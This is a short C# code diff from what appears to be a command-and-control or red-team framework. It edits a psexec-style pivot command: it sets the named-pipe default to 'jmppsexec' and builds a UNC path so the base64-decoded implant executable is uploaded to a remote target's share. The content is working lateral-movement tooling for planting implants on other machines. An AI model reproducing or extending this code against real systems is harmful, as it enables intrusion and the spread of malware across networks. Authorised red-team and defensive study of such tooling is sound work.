@@ -18,7 +18,7 @@ namespace Common.AgentCommands.Custom
         [Option("v", "verbose", "Show details of the command execution.")]
         public bool verbose { get; set; }
 
-        [Option("n", "pipe", "Name of the pipe used to pivot.", DefaultValue = "jmp")]
+        [Option("n", "pipe", "Name of the pipe used to pivot.", DefaultValue = "jmppsexec")]
         public string pipe { get; set; }
 
         [Option("f", "file", "FileName of payload.")]
@@ -82,7 +82,7 @@ namespace Common.AgentCommands.Custom
             if (Path.GetExtension(fileName).ToLower() != ".exe")
                 fileName += ".exe";
 
-            string path = options.path + (options.path.EndsWith('\\') ? String.Empty : '\\') + fileName;
+            string path = "\\\\" + options.Target + '\\' + options.path + (options.path.EndsWith('\\') ? String.Empty : '\\') + fileName;
 
             context.Echo($"[>] Saving implant to {path}");
             context.Upload(Convert.FromBase64String(implant.Data), path);
